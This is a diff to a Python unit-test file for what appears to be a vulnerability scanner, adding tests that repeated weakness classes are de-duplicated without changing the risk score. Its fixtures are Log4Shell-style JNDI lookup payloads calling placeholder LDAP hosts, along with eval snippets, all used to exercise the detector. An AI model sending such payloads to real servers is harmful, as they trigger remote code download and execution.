@@ -136,6 +136,51 @@ class ScannerTests(unittest.TestCase):
         result = self.scanner.analyze_code_snippet("result = eval(user_input)\n")
         self.assertGreater(result["vector"]["code_injection"], 0)
 
+    # ------------------------------------------------------------------
+    # Duplicate weakness classes
+    #
+    # The same flaw turns up in every harvested proof-of-concept. Keying the
+    # de-duplication on the line number reported one bug once per artefact,
+    # which made the findings list read as a wall of duplicates.
+    # ------------------------------------------------------------------
+    def test_same_class_in_many_blocks_is_reported_once(self) -> None:
+        blocks = [
+            {"code": "payload = '${jndi:ldap://a.example.com/Exploit}'\n"},
+            {"code": "payload = '${jndi:ldap://b.example.com/Exploit}'\n"},
+            {"code": "payload = '${jndi:ldap://c.example.com/Exploit}'\n"},
+        ]
+        result = self.scanner.analyze_many(blocks)
+        titles = [f["title"] for f in result["findings"]]
+        self.assertEqual(
+            len(titles),
+            len(set(titles)),
+            f"duplicate weakness classes survived: {titles}",
+        )
+        jndi = [f for f in result["findings"] if "JNDI" in f["title"]]
+        self.assertEqual(len(jndi), 1, jndi)
+        self.assertEqual(jndi[0]["occurrences"], 3, jndi[0])
+
+    def test_same_class_at_two_lines_is_reported_once(self) -> None:
+        code = "a = eval(x)\nb = 1\nc = eval(y)\n"
+        result = self.scanner.analyze_code_snippet(code)
+        titles = [f["title"] for f in result["findings"]]
+        self.assertEqual(len(titles), len(set(titles)), titles)
+        self.assertTrue(any(f["occurrences"] >= 2 for f in result["findings"]))
+
+    def test_merging_does_not_change_the_score(self) -> None:
+        """Collapsing duplicates must not inflate or deflate the risk score."""
+        single = self.scanner.analyze_code_snippet(
+            "payload = '${jndi:ldap://a.example.com/Exploit}'\n"
+        )
+        many = self.scanner.analyze_many(
+            [
+                {"code": "payload = '${jndi:ldap://a.example.com/Exploit}'\n"},
+                {"code": "payload = '${jndi:ldap://b.example.com/Exploit}'\n"},
+            ]
+        )
+        self.assertEqual(many["risk_score"], single["risk_score"])
+        self.assertEqual(many["severity_label"], single["severity_label"])
+
 
 if __name__ == "__main__":
     unittest.main(verbosity=2)
